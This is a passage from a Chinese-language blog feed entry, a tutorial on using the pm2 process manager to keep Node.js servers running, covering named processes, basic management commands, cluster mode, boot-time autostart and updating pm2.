src="../images/node/pm1.png" title="pm2运行结果图"></p><p>当我们启动一两个个程序的时候，会看到：<br><img src="../images/node/pm2.png" title="pm2运行结果图"></p><p>我们可以给这个进程自定义一个名字：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start build/dev-server.js --name vue-cli</span><br></pre></td></tr></table></figure><p>这个时候会看到原先的那个进程被杀掉了<code>errored</code><br><img src="../images/node/pm3.png" title="pm2运行结果图"></p></li><li><p>方法2：<br>直接通过原先的命令来替换执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start npm -- run dev    <span class="comment"># npm run dev 的替换命令</span></span><br></pre></td></tr></table></figure></li></ul><p>3、用法</p><ul><li><p>最简单的启用一个应用：<code>pm2 start app.js</code></p></li><li><p>停止：<code>pm2 stop app_name|app_id</code></p></li><li><p>删除：<code>pm2 delete app_name|app_id</code></p></li><li><p>删除所有：<code>pm2 delete all</code></p></li><li><p>重启：<code>pm2 restart app_name|app_id</code></p></li><li><p>停止所有：<code>pm2 stop all</code></p></li><li><p>查看所有的进程：<code>pm2 list</code></p></li><li><p>查看所有的进程状态：<code>pm2 status</code></p></li><li><p>查看某一个进程的信息：<code>pm2 describe app_name|app_id</code></p></li><li><p>监视每个node进程的CPU和内存的使用情况：<code>pm2 monit</code></p></li></ul><p>4、负载均衡<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pm2 start app.js -i 3   <span class="comment"># 开启三个进程</span></span><br><span class="line"></span><br><span class="line">pm2 start app.js -i max   <span class="comment"># 根据机器CPU核数，开启对应数目的进程</span></span><br></pre></td></tr></table></figure></p><p>5、开机自动启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过 pm2 save 保存当前进程状态。</span><br><span class="line"></span><br><span class="line">通过 pm2 startup [platform] 生成开机自启动的命令。例如：pm2 startup centos/ubuntu</span><br><span class="line"></span><br><span class="line">将步骤2生成的命令，粘贴到控制台进行，搞定。</span><br></pre></td></tr></table></figure></p><p>6、更新pm2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install pm2@latest -g    <span class="comment"># 更新版本</span></span><br><span class="line"></span><br><span class="line">pm2 update    <span class="comment"># 更新内存</span></span><br></pre></td></tr></table></figure></p><blockquote><p>和pm2相同的工具，如forever，请查看简书<a href="https://www.jianshu.com/p/669a618f3212" target="_blank" rel="noopener">极地瑞雪 (使用forever让node.js持久运行)</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      pm永久开启node服务器，无需开启终端
    
    </summary>
    
    
      <category term="Node" scheme="http://pimichen.com/blog/tags/node/"/>
    
  </entry>
  
</feed>
